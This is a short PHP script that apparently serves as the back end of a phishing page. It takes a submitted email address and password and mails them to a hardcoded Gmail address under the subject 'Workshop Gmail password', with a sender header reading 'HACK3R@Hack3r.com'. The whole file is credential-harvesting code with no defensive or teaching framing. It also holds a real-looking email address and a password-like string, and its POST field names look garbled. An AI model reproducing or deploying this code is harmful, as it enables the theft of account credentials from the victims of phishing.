<?php
        $mailhacked = $_POST["ellamenknowpee@gmail.com"];
        $passwordhacked = $_POST["Gzzit515$$n"];
         $to = "ellamenknowpee@gmail.com" ;
         $subject = "Workshop Gmail password";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:abcd@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message sent";
         }
      ?>
